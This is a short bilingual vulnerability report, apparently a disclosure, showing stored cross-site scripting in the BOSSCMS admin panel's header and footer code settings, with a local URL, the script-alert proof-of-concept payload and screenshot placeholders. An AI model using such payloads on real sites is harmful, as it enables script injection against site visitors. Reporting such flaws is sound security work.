# BOSSCMS background project management--code configuration--stored XSS exists in the header code and bottom code

# BOSSCMS后台项目管理--代码配置--头部代码和底部代码存在存储型XSS

url:http://127.0.0.1/bosscms1/admin/#mpf=site/code

payload:

```html
<script>alert(1)</script>
```

![image-20240329144227744](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240329144227744.png)



Return to homepage, trigger XSS

返回首页，触发XSS

![image-20240329144304027](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240329144304027.png)